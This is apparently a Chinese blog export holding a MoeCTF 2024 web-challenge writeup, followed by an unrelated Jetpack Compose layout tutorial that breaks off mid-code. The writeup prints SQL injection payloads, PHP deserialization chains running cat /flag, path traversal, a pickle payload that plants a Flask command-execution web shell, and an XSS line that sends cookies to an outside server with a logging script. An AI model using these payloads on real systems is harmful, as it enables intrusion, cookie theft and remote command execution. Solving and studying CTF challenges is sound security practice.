表白叭，300份才能证明你的爱！\n在网页源码中存在JavaScript提交检测，提交之后会在本地存储生成一个confessionSubmitted，如果值为true则点击按钮之后请求会被拦截到。\n有两种解决方法，第一个比较笨拙原始，因为他是检测的本地存储，则可以自己修改\n不过由于要发送三百次，那就用第二种方法，在第一次触发请求的时候用burpsuite拦截，然后用intruder模块进行发包\n弗拉格之地的挑战 #\r第一步，进入 /flag1ab.html ，查看网页源码\n\u0026lt;!--恭喜你找到了网页的源代码，通常在这里题目会放一些提示，做题没头绪一定要先进来看一下--\u0026gt;\r\u0026lt;!--flag1: bW9lY3Rm--\u0026gt;\r\u0026lt;!--下一步：/flag2hh.php--\u0026gt; 第二步，查看消息头\nflag2: e0FmdEV\rnextpage: /flag3cad.php 第三步，抓包\nflag3: yX3RoMXN\r\u0026lt;a href=\u0026#39;/flag4bbc.php\u0026#39;\u0026gt;前往下一关\u0026lt;/a\u0026gt; 第四步，在HTTP头里加一个 Referer: http://localhost:8080/flag3cad.php?a=1 ，跳转到第四关\n在js代码中可以只要按钮的id是9就行了，直接F12修改就行\n恭喜你！你已经知道，前端的一切都是可以更改的！\rflag4: fdFVUMHJ\r前往：/flag5sxr.php 第五步，前端js有检查字符串，可以直接抓包修改，或者浏览器设置里禁用JS即可\n\u0026lt;p\u0026gt;恭喜，我相信你已经深刻了解了前端不可信任的道理!\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;flag5: fSV90aDF\u0026lt;/p\u0026gt;\r\u0026lt;a href=\u0026#39;flag6diw.php\u0026#39;\u0026gt;前往下一关\u0026lt;/a\u0026gt; 第六步，源码如下,moe在无模式的时候不能直接匹配到flag，但是在忽略大小写的时候要匹配到flag，那么直接传参 moe=FLAG 即可\n\u0026lt;?php\rhighlight_file(\u0026#34;flag6diw.php\u0026#34;);\rif (isset($_GET[\u0026#39;moe\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;moe\u0026#39;]) {\rif (preg_match(\u0026#39;/flag/\u0026#39;, $_GET[\u0026#39;moe\u0026#39;])) {\rdie(\u0026#34;no\u0026#34;);\r} elseif (preg_match(\u0026#39;/flag/i\u0026#39;, $_GET[\u0026#39;moe\u0026#39;])) {\recho \u0026#34;flag6: xxx\u0026#34;;\r}\r} flag6: rZV9VX2t 第七步，POST传参 what=system(\u0026ldquo;cat /flag7 \u0026ldquo;);\n在根目录下拿到flag7，并且得到提示是base64加密，把七个flag拼一下解密就行了\nflag7: rbm93X1dlQn0= 静态网页 #\rF12看到有这哥/api/get的请求，进去查看将id改为0，报错引出一个新的php文件如下\n\u0026lt;?php\rhighlight_file(\u0026#39;final1l1l_challenge.php\u0026#39;);\rerror_reporting(0);\rinclude \u0026#39;flag.php\u0026#39;;\r$a = $_GET[\u0026#39;a\u0026#39;];\r$b = $_POST[\u0026#39;b\u0026#39;];\rif (isset($a) \u0026amp;\u0026amp; isset($b)) {\rif (!is_numeric($a) \u0026amp;\u0026amp; !is_numeric($b)) {\rif ($a == 0 \u0026amp;\u0026amp; md5($a) == $b[$a]) {\recho $flag;\r} else {\rdie(\u0026#39;noooooooooooo\u0026#39;);\r}\r} else {\rdie( \u0026#39;Notice the param type!\u0026#39;);\r}\r} else {\rdie( \u0026#39;Where is your param?\u0026#39;);\r} 首先a和b都不能是数字，并且a的值要是0，b[a]也要等于a的md5值。\n思路：a是一个md5处理后0e开头的一个字符串（因为是两个等号，弱比较，0exxxx都等于0）。b的第一个字符应该是0，并且不能是纯数字。\n电院_Backend #\r在robots.txt中发现/admin路由，进去是登陆界面，源码有点长，这里只看有用的地方\nif(!preg_match(\u0026#34;/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\\\.[a-zA-Z0-9]+/\u0026#34;, $email)||preg_match(\u0026#34;/or/i\u0026#34;, $email)){\recho json_encode(array(\u0026#39;status\u0026#39; =\u0026gt; 0,\u0026#39;info\u0026#39; =\u0026gt; \u0026#39;不存在邮箱为： \u0026#39;.$email.\u0026#39; 的管理员账号！\u0026#39;));\runset($_SESSION[\u0026#39;captcha_code\u0026#39;]);\rexit;\r}\r$sql = \u0026#34;SELECT * FROM admin WHERE email=\u0026#39;$email\u0026#39; AND pwd=\u0026#39;$pwd\u0026#39;\u0026#34;; 这里邮箱就只是一个正常邮箱格式，并且其中不能有or关键字，sql语句也只是简单的单引号闭合\n密码随便输，账号如图就行了，直接截断掉了后面的pwd。\npop moe #\r整个pop链条是很简单的，从000到003直接走下来就行了，也不多说了\n\u0026lt;?php\rclass class000 {\rprivate $payl0ad = 1;\rprotected $what;\rfunction __construct()\r{\r$this-\u0026gt;what=new class001();\r}\r}\rclass class001 {\rpublic $payl0ad=\u0026#34;dangerous\u0026#34;;\rpublic $a;\rfunction __construct()\r{\r$this-\u0026gt;a=new class002();\r}\r}\rclass class002 {\rprivate $sec;\rfunction __construct()\r{\r$this-\u0026gt;sec=new class003();\r}\r}\rclass class003 {\rpublic $mystr=\u0026#34;phpinfo()\u0026#34;;\r}\recho serialize(new class000());\rhttp://127.0.0.1:58271/?data=O:8:\u0026#34;class000\u0026#34;:2:{s:17:\u0026#34;%00class000%00payl0ad\u0026#34;;i:1;s:7:\u0026#34;%00*%00what\u0026#34;;O:8:\u0026#34;class001\u0026#34;:2:{s:7:\u0026#34;payl0ad\u0026#34;;s:9:\u0026#34;dangerous\u0026#34;;s:1:\u0026#34;a\u0026#34;;O:8:\u0026#34;class002\u0026#34;:1:{s:13:\u0026#34;%00class002%00sec\u0026#34;;O:8:\u0026#34;class003\u0026#34;:1:{s:5:\u0026#34;mystr\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}}}} 把private和protect的不可见字符替换成%00就行了\n勇闯铜人阵 #\r典型的python题目，先查看答案在网页源码中的格式\nimport re\rimport requests\rrequest = requests.session()\rurl = \u0026#34;http://127.0.0.1:53218/\u0026#34;\rbegin = {\u0026#34;player\u0026#34;: \u0026#34;123\u0026#34;, \u0026#34;direct\u0026#34;: \u0026#34;弟子明白\u0026#34;}\rpattern = re.compile(\u0026#39;\u0026lt;h1 id=\u0026#34;status\u0026#34;\u0026gt;\\s*(.+?)\\s*\u0026lt;/h1\u0026gt;\u0026#39;)\r# 方向映射\rdirections_map = {\r\u0026#34;1\u0026#34;: \u0026#34;北方\u0026#34;,\r\u0026#34;2\u0026#34;: \u0026#34;东北方\u0026#34;,\r\u0026#34;3\u0026#34;: \u0026#34;东方\u0026#34;,\r\u0026#34;4\u0026#34;: \u0026#34;东南方\u0026#34;,\r\u0026#34;5\u0026#34;: \u0026#34;南方\u0026#34;,\r\u0026#34;6\u0026#34;: \u0026#34;西南方\u0026#34;,\r\u0026#34;7\u0026#34;: \u0026#34;西方\u0026#34;,\r\u0026#34;8\u0026#34;: \u0026#34;西北方\u0026#34;\r}\rdef format_directions(nums):\rif len(nums) == 1:\r# 列表中只有一个数字，直接返回方向名称\rdirection = directions_map.get(nums[0], \u0026#34;未知\u0026#34;)\rreturn f\u0026#34;{direction}\u0026#34;\rformatted_directions = []\rfor num in nums:\rdirection = directions_map.get(num, \u0026#34;未知\u0026#34;)\rformatted_directions.append(f\u0026#34;{direction}一个\u0026#34;)\rreturn \u0026#34;，\u0026#34;.join(formatted_directions)\rfor i in range(6):\rif i == 0:\rresponse = request.post(url=url, data=begin)\rprint(response.text)\relse:\rdirect_str = format_directions(nums)\rprint(direct_str, \u0026#34;direct\u0026#34;)\rresponse = request.post(url=url, data={\u0026#34;player\u0026#34;: \u0026#34;123\u0026#34;, \u0026#34;direct\u0026#34;: direct_str})\rprint(response.text)\rnum = re.findall(pattern, response.text)[0]\rnums = re.findall(r\u0026#39;\\d+\u0026#39;, num) # 直接使用提取出来的顺序\rdirections = [directions_map.get(n, \u0026#34;未知\u0026#34;) for n in nums]\rprint(f\u0026#34;方向数字: {nums}\u0026#34;)\rprint(f\u0026#34;对应方位: {directions}\\n\u0026#34;) Re: 从零开始的 XDU 教书生活 #\r题目信息\n本题约定：所有账号的用户名 == 手机号 == 密码。教师账号用户名：10000。\n当浏览器开启签到页面时，二维码每 10 秒刷新一次，使用过期的二维码无法完成签到。（浏览器不开启签到页面时，不会进行自动刷新，可以持续使用有效的二维码，除非手动发送刷新二维码的请求） 当你完成任务后，请结束签到活动。你将会获得 Flag 。\n也是一个写脚本的问题，只不过比铜人阵要复杂一点点，由于代码过长，这里只讲思路。\n登录接口抓包可以发现，uname和password是经过加密的，加密逻辑没有直接给出，但是解密逻辑在app.py中有，可以逆推到加密方式，这样就能对每个学生进行登陆操作获取该学生的token（老师的token也能这样获取到）\n#burpsuite\rPOST /fanyalogin HTTP/1.1\r#省略掉不重要的部分\rCookie: token=4ba20ea2-5458-4d48-beaf-0e4a61bcbe08; retainlogin=1\rfid=-1\u0026amp;uname=/LgCkbIdwG1Do95thvCwcA==\u0026amp;password=/LgCkbIdwG1Do95thvCwcA==\u0026amp;refer=https%3A%2F%2Fi.chaoxing.com\u0026amp;t=true\u0026amp;forbidotherlogin=0\u0026amp;validate=\u0026amp;doubleFactorLogin=0\u0026amp;independentId=0\u0026amp;independentNameId=0\r#app.py\rdef decrypt_by_aes(encrypted: str, key: str, iv: str) -\u0026gt; str:\rkey_bytes = key.encode(\u0026#34;utf-8\u0026#34;)\riv_bytes = iv.encode(\u0026#34;utf-8\u0026#34;)\rcipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)\rencrypted_bytes = base64.b64decode(encrypted)\rdecrypted_bytes = cipher.decrypt(encrypted_bytes)\rpad = decrypted_bytes[-1]\rdecrypted_bytes = decrypted_bytes[:-pad]\rdecrypted = decrypted_bytes.decode(\u0026#34;utf-8\u0026#34;)\rreturn decrypted\r#据此逆推出加密函数，可借助AI生成代码\rdef encrypt_by_aes(plain_text: str, key: str, iv: str) -\u0026gt; str:\rkey_bytes = key.encode(\u0026#34;utf-8\u0026#34;)\riv_bytes = iv.encode(\u0026#34;utf-8\u0026#34;)\rcipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)\rpad = 16 - (len(plain_text) % 16)\rpadded_text = plain_text + chr(pad) * pad\rencrypted_bytes = cipher.encrypt(padded_text.encode(\u0026#34;utf-8\u0026#34;))\rencrypted_base64 = base64.b64encode(encrypted_bytes).decode(\u0026#34;utf-8\u0026#34;)\rreturn encrypted_base64 将老师页面的二维码另存到桌面，并且上传，可以看到是访问了这个路由并且传了参数\n回到代码，其中需要手动更改的参数只有c和enc，也就是对应的全局变量，而二维码的生成逻辑里可以看出是有这两个参数的\n@app.route(\u0026#34;/widget/sign/e\u0026#34;, methods=[\u0026#34;GET\u0026#34;])\rdef e():\rtoken = request.cookies.get(\u0026#34;token\u0026#34;)\rif token is None or token not in token_user or token_user[token] == teacher_phone:\rreturn redirect(\u0026#34;/login\u0026#34;)\rif request.args.get(\u0026#34;id\u0026#34;) != str(active_id) or request.args.get(\u0026#34;c\u0026#34;) != sign_code or request.args.get(\u0026#34;enc\u0026#34;) != enc:\rreturn \u0026#34;二维码已过期。\u0026#34;\ruid = token_user[token]\rfor i in sign_list:\rif i[\u0026#34;uid\u0026#34;] == int(uid):\rif i[\u0026#34;status\u0026#34;] == 0:\rif active_status == 2:\ri[\u0026#34;status\u0026#34;] = 11\relse:\ri[\u0026#34;status\u0026#34;] = 1\rreturn status[i[\u0026#34;status\u0026#34;]]\r@app.route(\u0026#34;/v2/apis/sign/refreshQRCode\u0026#34;, methods=[\u0026#34;GET\u0026#34;])\rdef refreash_QRCode():\rglobal sign_code, enc\rsign_code = str(random.randint(3000000000000, 4000000000000))\renc = \u0026#34;\u0026#34;.join(random.choice([\u0026#34;0\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;9\u0026#34;, \u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;F\u0026#34;]) for _ in range(32))\rresponse = {\r\u0026#34;result\u0026#34;: 1,\r\u0026#34;msg\u0026#34;: \u0026#34;success\u0026#34;,\r\u0026#34;data\u0026#34;: {\r\u0026#34;enc\u0026#34;: enc,\r\u0026#34;signCode\u0026#34;:sign_code\r}, \u0026#34;errorMsg\u0026#34;: None\r}\rreturn jsonify(response) **那么整体的思路就来了：**先要用老师账号登录获取到学生列表，然后获取时间戳和enc，使用学生的账号登录获取到学生token，再用学生身份把时间戳和enc带到扫描二维码的路由\n完整代码\n#主程序.py\rfrom 获取学生列表 import get_student_list\rfrom 登录获取token import getToken\rfrom 获取时间戳和enc import get_timestamp_and_enc\rfrom 扫描二位码 import scan_qrcode\rimport concurrent.futures\rstudent_list = get_student_list()\renc, signcode = get_timestamp_and_enc() # 获取enc和signcode\rdef process_student(index):\rtemp_token = getToken(student_list[index]) # 获取单个学生的token\rscan_qrcode(sign_code=signcode, enc=enc, token=temp_token) # 扫描二维码\rreturn index\rwith concurrent.futures.ThreadPoolExecutor() as executor:\rfutures = [executor.submit(process_student, i) for i in range(len(student_list))]\rfor future in concurrent.futures.as_completed(futures):\ri = future.result()\rprint(i) #登录获取token.py\rimport requests\rfrom Crypto.Cipher import AES\rimport base64\rimport json\rimport re\rdef encrypt_by_aes(plain_text: str, key: str, iv: str) -\u0026gt; str:\rkey_bytes = key.encode(\u0026#34;utf-8\u0026#34;)\riv_bytes = iv.encode(\u0026#34;utf-8\u0026#34;)\rcipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)\rpad = 16 - (len(plain_text) % 16)\rpadded_text = plain_text + chr(pad) * pad\rencrypted_bytes = cipher.encrypt(padded_text.encode(\u0026#34;utf-8\u0026#34;))\rencrypted_base64 = base64.b64encode(encrypted_bytes).decode(\u0026#34;utf-8\u0026#34;)\rreturn encrypted_base64\rdef getToken(uname):\rpattern = re.compile(\u0026#34;token=(.*); E\u0026#34;)\rpoststr=encrypt_by_aes(uname,\u0026#34;u2oh6Vu^HWe4_AES\u0026#34;,\u0026#34;u2oh6Vu^HWe4_AES\u0026#34;)\rurl = \u0026#34;http://127.0.0.1:59835/fanyalogin\u0026#34;\rdata = {\r\u0026#34;fid\u0026#34;: \u0026#34;-1\u0026#34;,\r\u0026#34;uname\u0026#34;:f\u0026#34;{poststr}\u0026#34; ,\r\u0026#34;password\u0026#34;:f\u0026#34;{poststr}\u0026#34;,\r\u0026#34;refer\u0026#34;: \u0026#34;https://i.chaoxing.com\u0026#34;,\r\u0026#34;t\u0026#34;: \u0026#34;true\u0026#34;,\r\u0026#34;forbidotherlogin\u0026#34;: \u0026#34;0\u0026#34;,\r\u0026#34;validate\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;doubleFactorLogin\u0026#34;: \u0026#34;0\u0026#34;,\r\u0026#34;independentId\u0026#34;: \u0026#34;0\u0026#34;,\r\u0026#34;independentNameId\u0026#34;: \u0026#34;0\u0026#34;\r}\rheaders=requests.post(url=url,data=data).headers[\u0026#39;Set-Cookie\u0026#39;]\rreturn re.findall(pattern,headers)[0] #获取学生列表.py\rimport requests\rimport json\rfrom 登录获取token import getToken\rdef get_student_list():\r# 创建一个会话\rrequest = requests.session()\r# 请求的URL\rurl = \u0026#34;http://127.0.0.1:59835/widget/sign/pcTeaSignController/showSignInfo1?activeId=4000000000000\u0026amp;webCacheId=4000000000000\u0026amp;appType=15\u0026amp;_=1723951358863\u0026#34;\rteacher_token=getToken(\u0026#39;10000\u0026#39;)\r# 设置Cookie\rcookie = {\u0026#34;retainlogin\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;token\u0026#34;: f\u0026#34;{teacher_token}\u0026#34;} #用老师的身份来进行获取学生\r# 发送GET请求\rreq = request.get(url=url, cookies=cookie)\r# 解析响应的JSON内容\rdata = json.loads(req.text)\r# 从解析的JSON中提取name字段\rname_list = [item[\u0026#34;name\u0026#34;] for item in data[\u0026#34;data\u0026#34;][\u0026#34;changeUnSignList\u0026#34;]]\rprint(teacher_token)\rreturn name_list\rprint(get_student_list()) #获取时间戳和enc.py\rfrom datetime import datetime, timedelta, timezone\rimport json\rimport requests\rfrom 登录获取token import getToken\rdef get_current_timestamp() -\u0026gt; int:\rreturn int(datetime.now().timestamp() * 1000)\rdef get_timestamp_and_enc():\rbase_url= \u0026#34;http://127.0.0.1:62019\u0026#34;\rget_enc_signCode = f\u0026#34;{base_url}/v2/apis/sign/refreshQRCode?activeId=4000000000000\u0026amp;time={get_current_timestamp()}\u0026amp;viewFrom=\u0026amp;viceScreen=0\u0026amp;viceScreenEwmEnc=\u0026#34;\rtoken=getToken(\u0026#34;10000\u0026#34;)\rreq=requests.get(get_enc_signCode,headers={\r\u0026#34;Cookie\u0026#34;:f\u0026#34;token={token}; retainlogin=1\u0026#34;\r})\rresponse_body=json.loads(req.content.decode())\renc = response_body[\u0026#39;data\u0026#39;][\u0026#39;enc\u0026#39;]\rsigncode = response_body[\u0026#39;data\u0026#39;][\u0026#39;signCode\u0026#39;]\rprint(enc,signcode)\rreturn (enc,signcode) #扫描二维码.py\rimport requests\rfrom 获取时间戳和enc import get_timestamp_and_enc\rdef scan_qrcode(sign_code,enc,token):\rrequest= requests.session()\rurl=\u0026#34;http://127.0.0.1:62019/widget/sign/e\u0026#34;\rurl_data=f\u0026#34;?id=4000000000000\u0026amp;c={sign_code}\u0026amp;enc={enc}\u0026amp;DB_STRATEGY=PRIMARY_KEY\u0026amp;STRATEGY_PARA=id\u0026#34;\rrequest.get(url=url+url_data,headers={\r\u0026#34;Cookie\u0026#34;:f\u0026#34;token={token}; retainlogin=1\u0026#34;\r}) 因为二维码是10秒会刷新一下，多运行几次主程序就好了。（懒得改代码）\n欢迎来到垫刀之路 #\r一个简单的命令执行，cat /flag之后提示说在环境变量中。\n有可能会在/proc/1/environ里，但是遍历过后发现不存在。发现可以使用php的命令行形式来执行，搜索字符串即可\nphp -r \u0026#34;phpinfo();\u0026#34; ImageCloud前置 #\r命令执行+php伪协议读取/etc/passwd\nhttp://127.0.0.1:53159/index.php?url=file:///etc/passwd 垫刀之路02: 普通的文件上传 #\rmime类型抓包修改为image/jpeg即可绕过\n垫刀之路03: 这是一个图床 #\r前端文件名后缀校验，将正常木马后缀改为jpg，然后抓包改回即可\n垫刀之路04: 一个文件浏览器 #\rhttp://127.0.0.1:55317/?path=../../../../../../var/www/html/index.php 测试可以进行目录穿越读取数据，并且在index.php里看到了如果path是个目录还会把目录中的所有文件及目录返回到页面中，一个一个点进去看，在根目录下/tmp/flag找到\n垫刀之路05: 登陆网站 #\r抓个包设置password字段，payload可以用burpsuite自带的sql字典，也可以从网上找。\nusername=admin123\u0026amp;password=123\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\r#单引号闭合 垫刀之路06: pop base mini moe #\r\u0026lt;?php\rclass A {\r// 注意 private 属性的序列化哦\rprivate $evil;\r// 如何赋值呢\rprivate $a;\rfunction __construct()\r{\r$this-\u0026gt;a=new B();\r$this-\u0026gt;evil=\u0026#34;ls\u0026#34;;\r}\r}\rclass B {\rprivate $b=\u0026#34;system\u0026#34;;\r}\recho serialize(new A());\rhttp://127.0.0.1:63135/?data=O:1:\u0026#34;A\u0026#34;:2:{s:7:\u0026#34;%00A%00evil\u0026#34;;s:9:\u0026#34;cat /flag\u0026#34;;s:4:\u0026#34;%00A%00a\u0026#34;;O:1:\u0026#34;B\u0026#34;:1:{s:4:\u0026#34;%00B%00b\u0026#34;;s:6:\u0026#34;system\u0026#34;;}} 垫刀之路07: 泄漏的密码 #\r页面给了pin码，进入/console路由，输入pin码进入终端。\n环境变量中拿到flag\nImageCloud #\r题目信息给出，flag在名为flag.jpg的图片中，并且附件中flag.jpg存在于uploads文件夹。\n附件中存在两个flask服务的python文件，一个是5000端口的外部云文件，保存图片路径为static，另一个是端口在5001到6000中间随机的内部云文件，保存路径是uploads。\n#外部云\r@app.route(\u0026#39;/image\u0026#39;, methods=[\u0026#39;GET\u0026#39;])\rdef load_image():\rurl = request.args.get(\u0026#39;url\u0026#39;)\rif not url:\rreturn \u0026#39;URL 参数缺失\u0026#39;, 400\rtry:\rresponse = requests.get(url)\rresponse.raise_for_status()\rimg = Image.open(BytesIO(response.content))\rimg_io = BytesIO()\rimg.save(img_io, img.format)\rimg_io.seek(0)\rreturn send_file(img_io, mimetype=img.get_format_mimetype())\rexcept Exception as e:\rreturn f\u0026#34;无法加载图片: {str(e)}\u0026#34;, 400 从外部云这里可以发现，image路由可以对内部云进行请求获取图片。\n先随便上传一个图片，然后对其抓包，尝试爆破内部云端口。\nhttp://127.0.0.1:56188/image?url=http://localhost:5412/image/flag.jpg #\rwho\u0026rsquo;s blog?\n进入题目，提示用id来进行传参。题目环境是用python搭建的，容易想到SSTI模板注入漏洞。\nflag在环境变量里\nPetStore #\r题目给出提示是关于python的pickle反序列化漏洞。\n拿到源码关注导入部分的函数\ndef import_pet(self, serialized_pet) -\u0026gt; bool:\rtry:\rpet_data = base64.b64decode(serialized_pet)\rpet = pickle.loads(pet_data)\rif isinstance(pet, Pet):\rfor i in self.pets:\rif i.uuid == pet.uuid:\rreturn False\rself.pets.append(pet)\rreturn True\rreturn False\rexcept Exception as e:\rprint(f\u0026#34;Import failed: {str(e.decode())}\u0026#34;)\rreturn False 可以看到这个路由是直接拿到数据就进行load，这里就存在反序列化漏洞，后续的不重要。\n由于题目不出网，无法外带，经过信息搜集之后发现，Flask可以进行写入内存马。\n下面是相关知识链接。\n(・ω\u0026lt; )★Flask内存马 | 雲流のLowest World (c1oudfl0w0.github.io)\nflask不出网回显方式 - Longlone\u0026rsquo;s Blog\nimport pickle\rimport base64\rimport uuid\rimport os\rclass Pet:\rdef __init__(self, name, species) -\u0026gt; None:\rself.name = name\rself.species = species\rself.uuid = uuid.uuid4()\rdef __repr__(self) -\u0026gt; str:\rreturn f\u0026#34;Pet(name={self.name}, species={self.species}, uuid={self.uuid})\u0026#34;\rdef __reduce__(self):\rreturn (eval,(\u0026#34;__import__(\\\u0026#34;sys\\\u0026#34;).modules[\u0026#39;__main__\u0026#39;].__dict__[\u0026#39;app\u0026#39;].before_request_funcs.setdefault(None, []).append(lambda :__import__(\u0026#39;os\u0026#39;).popen(request.args.get(\u0026#39;cmd\u0026#39;)).read())\u0026#34;,))\rp = Pet(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;)\ropcode = pickle.dumps(p)\ropcode_encode = base64.b64encode(opcode).decode()\rprint(opcode_encode)\r#gASVwgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIymX19pbXBvcnRfXygic3lzIikubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLCBbXSkuYXBwZW5kKGxhbWJkYSA6X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjbWQnKSkucmVhZCgpKZSFlFKULg== 然后将字符串进行import，即可在服务上产生一个新的监听，对cmd参数的命令执行。\n还有一个更简单的解法，直接把flag存入store里\nimport base64\rimport pickle\rclass Test:\rdef __reduce__(self):\rreturn (exec, (\u0026#34;import os; store.create_pet(os.getenv(\u0026#39;FLAG\u0026#39;), \u0026#39;flag\u0026#39;);\u0026#34;,))\rif __name__ == \u0026#34;__main__\u0026#34;:\rprint(base64.b64encode(pickle.dumps(Test())).decode(\u0026#34;utf-8\u0026#34;)) smbms #\r题目给出的测试sql附件中发现密码是弱密码，可以字典爆破\n密码是1234567，就可以登进去了。\n在获取用户列表这里是使用的直接拼接userName，再用%进行包裹。存在sql注入漏洞，是单引号闭合，只需要把后面的百分号无效化就行了。数据库的列数在sql的测试文件中有，最终尝试到14列。\n孙%\u0026#39; union select 1,(select database()),3,4,5,6,7,8,9,10,11,12,13,14 where \u0026#39;1%\u0026#39;=\u0026#39;1 可以看到成功爆出数据库名\n孙%\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14 where \u0026#39;1%\u0026#39;=\u0026#39;1 孙%\u0026#39; union select 1,(select flag from flag),3,4,5,6,7,8,9,10,11,12,13,14 where \u0026#39;1%\u0026#39;=\u0026#39;1 MessageBox #\r经典的web留言板\n从源码分析可以得出，只有luo用户的cookie中才具有真正的flag\n而留言板可以看到自己发出的，也可看到别人发给自己的\n初步猜测是XSS漏洞\n我在自己的服务器上创建了两个文件便于靶机外带cookie\n一个是test1.php，另一个是空的data.txt\n\u0026lt;?php\r$file = \u0026#39;data.txt\u0026#39;;\r// 写入文件\rif (!empty($_GET)) {\r$params = http_build_query($_GET);\r$escaped_params = htmlspecialchars($params, ENT_QUOTES, \u0026#39;UTF-8\u0026#39;);\rfile_put_contents($file, $escaped_params . \u0026#34;\\n\u0026#34;, FILE_APPEND);\r}\r// 读取并显示文件内容\rif (file_exists($file)) {\recho nl2br(file_get_contents($file));\r} else {\recho \u0026#34;没有提供任何参数\u0026#34;;\r}\r?\u0026gt; 然后将以下信息发给luo\n\u0026lt;img src=x onerror=this.src=\u0026#39;http://49.235.164.104/test1.php?c=\u0026#39;+document.cookie\u0026gt; 稍等一会，xss反弹回来就得到了真正的flag\n","date":"2024-08-13","externalUrl":null,"permalink":"/posts/2024/08/moectf-2024/","section":"Posts","summary":"","title":"MoeCTF 2024","type":"posts"},{"content":"","date":"2024-07-12","externalUrl":null,"permalink":"/tags/android/","section":"Tags","summary":"","title":"Android","type":"tags"},{"content":"","date":"2024-07-12","externalUrl":null,"permalink":"/categories/android/","section":"Categories","summary":"","title":"Android","type":"categories"},{"content":"\r目标 #\r构建一个健康应用，这款应用包含两个版块，一个列出了收藏合集，另一个列出了各种体育锻炼。具体如下图所示，包括竖屏和横屏的适配\n主要内容 #\r借助修饰符扩充可组合项\n通过 Column 和 LazyRow 等标准布局组件定位可组合子项\n通过对齐方式和排列方式更改可组合子项在父项中的位置\n借助 Scaffold 和 Bottom Navigation 等 Material 可组合项创建详细布局\n使用槽位 API 构建灵活的可组合项\n为不同的屏幕配置构建布局\n结构分析 #\r总体来说可以将应用分为内容和导航栏两个部分\n在内容部分又可以分为搜索栏、收藏栏以及运动收集网格\n搜索栏 #\r@Composable\rfun SearchBar(modifier: Modifier=Modifier)\r{\rTextField(value = \u0026#34;\u0026#34;,\ronValueChange = {},\rmodifier= modifier\r.fillMaxWidth()\r.heightIn(min = 56.dp),\rleadingIcon = {\rIcon(painter = painterResource(id = R.drawable.search), contentDescription = null )\r},\rcolors = TextFieldDefaults.colors(\runfocusedLabelColor = MaterialTheme.colorScheme.surface,\rfocusedContainerColor = MaterialTheme.colorScheme.surface,\r),\rplaceholder = {\rText(text = stringResource(R.string.search))\r}\r)\r} 图标是在Browse Fonts - Google Fonts这里下载的。总体代码还是比较简单的，这里先不涉及具体的文本处理。\n收藏栏 #\r首先要分析每个元素的具体结构。\n可以看到，要对图片进行裁剪，并且在图片下面要对齐相应的文字。\n使用modifier的clip对图片进行裁剪，并且可能会出现裁剪之后有残缺，又用了ContentScale对图片进行适当缩放来填满clip的形状\n@Composable\rfun AlignYourBodyElement(\rmodifier: Modifier=Modifier,\r@DrawableRes drawable:Int,\r@StringRes text:Int\r)\r{\rColumn(\rhorizontalAlignment = Alignment.CenterHorizontally,\rmodifier = modifier\r) {\rImage(painter = painterResource(id = drawable),\rcontentDescription =null ,\rmodifier= Modifier\r.size(88.dp)\r.clip(CircleShape),\rcontentScale = ContentScale.Crop\r)\rText(text = stringResource(id = text),\rmodifier=Modifier.paddingFromBaseline(top = 24.dp, bottom = 8.dp)\r)\r}\r} 这里涉及到了**@DrawableRes和@StringRes两个修饰符，显式规定了传入参数的类型可以被当作resource处理。类似于 R.string.username 这样的资源引用方式，实际上在程序中是以Int数字类型进行传递的（可以调试查看）。添加注解后，编译器会提前检查资源**是否合法存在，防止错误的资源类型传递。\n剩下的就是将每个元素进行横向排列\n@Composable\rfun AlignYourBodyRow(modifier: Modifier=Modifier)\r{\rval alignYourBodyData=\rlistOf(\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\r)\rLazyRow(\rmodifier=modifier,\rhorizontalArrangement = Arrangement.spacedBy(8.dp),\rcontentPadding = PaddingValues(horizontal = 16.dp)\r){\ritems(alignYourBodyData){\ritem-\u0026gt; AlignYourBodyElement(drawable = item.drawable, text = item.text)\r}\r}\r} 这里使用到了LazyRow（懒加载）而不是Row，原因就在于，LazyRow 只会渲染当前视图中的内容，有助于提高应用的性能。\n运动收集网格 #\rdata class FavoriteCollectionsData(\r@DrawableRes val drawable: Int,\r@StringRes val text: Int\r)\r@Composable\rfun FavoriteCollectionsGrid(modifier: Modifier=Modifier)\r{\rval favoriteCollectionsData= listOf(\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\r)\rLazyHorizontalGrid(\rrows = GridCells.Fixed(2),\rmodifier=modifier.height(168.dp),\rcontentPadding = PaddingValues(horizontal = 16.dp),\rhorizontalArrangement = Arrangement.spacedBy(16.dp),\rverticalArrangement = 